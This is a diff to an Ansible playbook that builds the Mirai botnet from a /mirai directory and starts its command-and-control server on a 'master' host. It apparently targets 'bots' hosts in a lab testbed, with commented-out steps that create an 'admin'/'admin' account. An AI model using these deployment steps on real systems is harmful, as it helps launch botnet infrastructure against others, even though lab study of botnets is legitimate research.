@@ -3,15 +3,62 @@
 - hosts: master
   become: true
   tasks:
-    - name: Installing Hey traffic analyzer
+    - name: Installing pkgs
+      apt: 
+        pkg:
+          - curl
+          - tcpdump
+    - name: Restarting shell
       shell: |
-        cd mirai && bash start.sh
+         cd /mirai && bash -c "source ${HOME}/.bashrc"
+    - name: Setup.sh
+      shell: |
+         cd /mirai && sudo bash setup.sh
+
+
+    - name: ./build.sh debug telnet
+      shell: |
+         cd /mirai && sudo bash build.sh debug telnet
+
+
+
+    - name: python3 setup.py
+      shell: |
+         cd /mirai && python3 setup.py
+
+    - name: ./build.sh debug telnet
+      shell: |
+         cd /mirai && sudo bash build.sh debug telnet
+
+#    - name: screen -S mirai-cnc sudo ./cnc
+#      shell: |
+#         cd /mirai/debug && screen -S mirai-cnc sudo ./cnc 
+
+#    - name: screen -S mirai-bot sudo ./mirai.dbg
+#      shell: |
+#         cd /mirai/debug && screen -S mirai-bot sudo ./mirai.dbg
+
+    - name: ./build.sh release telnet
+      shell: |
+         cd /mirai && sudo bash build.sh release telnet
+
+    - name: apache2.sh
+      shell: |
+         cd /mirai/release && sudo bash ../apache2.sh
+
+    - name: sudo screen -dmS mirai-cnc ./cnc
+      shell: |
+         cd /mirai/release && sudo screen -dmS mirai-cnc ./cnc
 
 - hosts: bots
   become: true
   tasks:
-    - name: Installing dns required packages
-      shell: |
-         adduser admin
-         passwd admin
+
+    - name: Installing pkgs
+      apt:
+        pkg:
+          - curl
+#    - name: Installing dns required packages
+#      shell: |
+#         useradd admin -p admin
 
